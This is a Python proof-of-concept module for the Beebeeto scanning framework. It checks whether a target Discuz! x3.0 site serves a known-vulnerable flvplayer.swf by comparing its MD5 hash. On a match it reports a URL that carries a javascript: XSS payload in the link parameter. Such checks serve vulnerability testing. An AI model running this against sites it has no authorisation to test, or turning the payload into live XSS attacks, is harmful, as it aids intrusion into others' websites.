#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import md5
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0057',
            'name': 'Discuz! x3.0 /static/image/common/flvplayer.swf 跨站脚本漏洞 POC',
            'author': '1024',
            'create_date': '2014-10-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['3.0'],
            'type': 'Cross Site Scripting',
            'tag': ['Discuz漏洞', 'Flash XSS漏洞', 'flvplayer.swf'],
            'desc': 'N/A',
            'references': ['http://www.ipuman.com/pm6/138/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        flash_md5 = "7d675405ff7c94fa899784b7ccae68d3"
        file_path = "/static/image/common/flvplayer.swf"
        verify_url = args['options']['target'] + file_path
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        md5_value = md5.new(content).hexdigest()
        if md5_value in flash_md5:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url + '?file=1.flv&linkfromdisplay=true&link=javascript:alert(1024);'
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
